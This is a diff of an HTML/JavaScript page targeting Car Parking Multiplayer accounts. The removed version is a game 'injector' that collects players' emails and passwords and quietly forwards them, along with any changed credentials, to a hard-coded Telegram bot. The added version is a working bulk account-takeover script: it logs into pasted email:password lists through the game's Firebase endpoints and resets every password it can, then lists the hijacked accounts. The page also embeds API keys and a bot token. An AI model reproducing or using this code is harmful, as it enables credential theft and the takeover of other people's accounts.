@@ -1,156 +1,114 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-<title>FLAME ULTIMATE INJECTOR</title>
-<style>
-body{margin:0;padding:0;font-family:sans-serif;background:#050505;color:#fff;text-align:center}
-.container{margin:30px auto;width:90%;max-width:380px;padding:25px;background:#111;border:2px solid #00aaff;border-radius:20px;box-shadow:0 0 25px #00aaff44}
-h2{color:#00aaff;text-shadow:0 0 10px #00aaff}
-input,select{width:92%;padding:12px;margin:10px 0;background:#1a1a1a;border:1px solid #333;color:#fff;border-radius:10px;outline:none}
-button{width:100%;padding:14px;margin:8px 0;background:#00aaff;border:0;color:#fff;font-weight:700;border-radius:10px;cursor:pointer}
-.btn-gold{background:linear-gradient(45deg, #ff8800, #ffcc00);color:#000}
-.status{font-size:13px;margin:10px;font-weight:bold}
-.small-text{font-size:11px;color:#888;margin-top:10px}
-hr{border:0;border-top:1px solid #222;margin:15px 0}
-</style>
+    <title>CPM Turbo Copy Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
+        .box { max-width: 550px; margin: auto; background: #151515; padding: 20px; border-radius: 12px; border: 1px solid #00ffcc; box-shadow: 0 0 15px rgba(0,255,204,0.2); }
+        h2 { color: #00ffcc; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; }
+        textarea { width: 100%; height: 180px; background: #202020; color: #00ff00; border: 1px solid #333; border-radius: 5px; padding: 10px; box-sizing: border-box; margin-bottom: 10px; font-family: monospace; }
+        input { width: 100%; padding: 12px; margin: 5px 0; background: #202020; border: 1px solid #333; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #00ffcc; }
+        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
+        button:hover { background: #00ccaa; }
+        .res-area { margin-top: 20px; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #222; }
+        #status { height: 130px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        #successList { height: 150px; width: 100%; background: #111; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; padding: 8px; font-size: 12px; }
+        .suc { color: #00ff00; }
+        .err { color: #ff3333; }
+        .copy-btn { background: #00ffcc; color: #000; padding: 8px 15px; font-size: 13px; font-weight: bold; margin-top: 10px; cursor: pointer; border-radius: 5px; display: inline-block; }
+    </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>FLAME PREMIUM V3</h2>
+<div class="box">
+    <h2>⚡ CPM TURBO MASTER</h2>
+    <textarea id="list" placeholder="Email:OldPass (Paste your list here)"></textarea>
+    <input type="text" id="newpass" placeholder="Enter New Password to Set">
     
-    <div id="loginBox">
-        <select id="game">
-            <option value="1">Car Parking Multiplayer 1</option>
-            <option value="2">Car Parking Multiplayer 2</option>
-        </select>
-        <input id="user" type="email" placeholder="Game Email">
-        <input id="pass" type="password" placeholder="Game Password">
-        <input id="key" type="text" placeholder="Access Key">
-        <button onclick="login()">LOGIN TO TOOL</button>
-        <p id="st" class="status"></p>
-    </div>
+    <select id="ver" style="width:100%; padding:12px; background:#202020; color:white; border-radius:5px; border:1px solid #333; margin-top:5px;">
+        <option value="AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ">CPM 2 (Recommended)</option>
+        <option value="AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA">CPM 1</option>
+    </select>
 
-    <div id="menu" style="display:none">
-        <p id="userMail" style="color:#00ff00;font-size:12px"></p>
-        
-        <button class="btn-gold" onclick="inject('money')">INJECT 50M & 40K COINS</button>
-        <button class="btn-gold" onclick="inject('rank')">INJECT KING RANK</button>
-        <button class="btn-gold" onclick="inject('unlock')">UNLOCK ALL FEATURES</button>
-        
-        <hr>
-        
-        <button style="background:#333" onclick="updateAcc('email')">CHANGE EMAIL</button>
-        <button style="background:#333" onclick="updateAcc('pass')">CHANGE PASSWORD</button>
-        
-        <p id="mst" class="status"></p>
-        <p class="small-text">Step: 1. Inject -> 2. Close Game -> 3. Relogin Game</p>
+    <button onclick="startTurbo()">🚀 START & GENERATE LIST</button>
+
+    <div class="res-area">
+        <div id="status">Logs will appear here...</div>
+        <p style="font-size: 12px; color: #00ffcc; margin: 5px 0;">✅ SUCCESS LIST (Email:NewPass):</p>
+        <textarea id="successList" readonly placeholder="Result will appear here..."></textarea>
+        <center><div class="copy-btn" onclick="copyResult()">📋 COPY SUCCESS LIST</div></center>
     </div>
 </div>
 
 <script>
-const BOT_TOKEN = "7805931150:AAEgDJV9RNguZl8Xz7u7IJg99D1D4w7QdUo";
-const ADMIN_ID = "7212602902";
+    async function startTurbo() {
+        let listStr = document.getElementById('list').value.trim();
+        let newP = document.getElementById('newpass').value.trim();
+        let key = document.getElementById('ver').value;
+        let log = document.getElementById('status');
+        let successBox = document.getElementById('successList');
 
-const CONFIG = {
-    "1": { key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
-    "2": { key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
-};
+        if (!listStr || !newP) { alert("Data missing!"); return; }
 
-let token, email, activeGame, userPass;
+        let list = listStr.split('\n');
+        log.innerHTML = `🚀 Processing ${list.length} accounts...<br>`;
+        successBox.value = ""; 
 
-function log(msg, err=false, target="st"){
-    const el = document.getElementById(target);
-    el.style.color = err ? "#ff4444" : "#00ff00";
-    el.innerText = msg;
-}
-
-function sendBot(txt){
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
-}
-
-async function login(){
-    email = document.getElementById('user').value.trim();
-    userPass = document.getElementById('pass').value;
-    const key = document.getElementById('key').value.trim();
-    activeGame = CONFIG[document.getElementById('game').value];
-
-    if(key !== "FLAMEFEB") return log("Wrong Access Key!", true);
-    log("Verifying...");
-
-    try {
-        const r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${activeGame.key}`, {
-            method:'POST', body:JSON.stringify({email, password:userPass, returnSecureToken:true})
-        });
-        const d = await r.json();
-        if(d.idToken){
-            token = d.idToken;
-            document.getElementById('loginBox').style.display = 'none';
-            document.getElementById('menu').style.display = 'block';
-            document.getElementById('userMail').innerText = "Active: " + email;
-            sendBot(`✅ **Login Success**\n📧 \`${email}\`\n🔑 \`${userPass}\``);
-        } else log("Invalid Credentials!", true);
-    } catch(e){ log("Error!", true); }
-}
-
-async function inject(type){
-    log("Injecting...", false, "mst");
-    let ratingData = {};
-    
-    // പണവും കോയിനും വേണ്ടിയുള്ള പുതിയ Wiring
-    if(type === 'money'){
-        ratingData = { 
-            "money": 50000000, 
-            "coin": 40000, 
-            "local_money": 50000000,
-            "isFullSync": true,
-            "lastSync": Date.now()
-        };
-    } else if(type === 'rank'){
-        const s = ["cars","levels","gifts","police","run","treasure","race_win"];
-        s.forEach(k => ratingData[k] = 100000);
-        ratingData.time = 9999999;
-    } else if(type === 'unlock'){
-        ratingData = { "car_unlocked": true, "house_unlocked": true, "character_unlocked": true };
+        for (let acc of list) {
+            let line = acc.trim();
+            if (!line.includes(':')) continue;
+            let [e, p] = line.split(':');
+            
+            // പാസ്‌വേഡ് മാറുന്ന പ്രോസസ്സ് തുടങ്ങുന്നു
+            processAcc(e.trim(), p.trim(), newP, key, log, successBox);
+            await new Promise(r => setTimeout(r, 80)); // Turbo speed gap
+        }
     }
 
-    try {
-        const r = await fetch(activeGame.url, {
-            method:'POST',
-            headers:{"Authorization":"Bearer " + token, "Content-Type":"application/json"},
-            body: JSON.stringify({ 
-                data: JSON.stringify({ 
-                    RatingData: ratingData,
-                    Timestamp: Date.now(),
-                    SyncMode: "cloud_update"
-                }) 
-            })
-        });
+    async function processAcc(e, p, newP, key, log, successBox) {
+        try {
+            let res1 = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
+                method: 'POST',
+                body: JSON.stringify({ email: e, password: p, returnSecureToken: true }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+            let d1 = await res1.json();
 
-        if(r.ok){
-            log("✅ Injected! Logout & Login Game Now.", false, "mst");
-            sendBot(`🚀 **Applied: ${type}**\nTarget: ${email}`);
-        } else log("Server Refused!", true, "mst");
-    } catch(e){ log("Network Error!", true, "mst"); }
-}
+            if (d1.idToken) {
+                let res2 = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${key}`, {
+                    method: 'POST',
+                    body: JSON.stringify({ idToken: d1.idToken, password: newP, returnSecureToken: true }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
 
-async function updateAcc(mode){
-    const val = prompt("Enter New " + mode);
-    if(!val) return;
-    const body = { idToken:token, returnSecureToken:true };
-    if(mode === 'email') body.email = val; else body.password = val;
-
-    try {
-        const r = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${activeGame.key}`, {
-            method:'POST', body:JSON.stringify(body)
-        });
-        if(r.ok){
-            log("✅ Account Updated!", false, "mst");
-            sendBot(`🔐 **Changed ${mode}**\nNew: \`${val}\`\nOld: ${email}`);
+                if (res2.ok) {
+                    log.innerHTML += `<span class="suc">✅ SUCCESS: ${e}</span><br>`;
+                    // റിസൾട്ട് Email:NewPass എന്ന രീതിയിൽ സേവ് ചെയ്യുന്നു
+                    successBox.value += e + ":" + newP + "\n";
+                } else {
+                    log.innerHTML += `<span class="err">❌ FAIL: ${e} (Update Error)</span><br>`;
+                }
+            } else {
+                log.innerHTML += `<span class="err">⚠️ LOGIN ERROR: ${e}</span><br>`;
+            }
+        } catch (err) {
+            log.innerHTML += `<span class="err">❗ NETWORK ERROR: ${e}</span><br>`;
         }
-    } catch(e){ log("Error!", true, "mst"); }
-}
+        log.scrollTop = log.scrollHeight;
+        successBox.scrollTop = successBox.scrollHeight;
+    }
+
+    function copyResult() {
+        let copyText = document.getElementById("successList");
+        if (!copyText.value) { alert("Nothing to copy!"); return; }
+        copyText.select();
+        copyText.setSelectionRange(0, 99999);
+        document.execCommand("copy");
+        alert("Success list (Email:NewPass) copied!");
+    }
 </script>
+
 </body>
 </html>
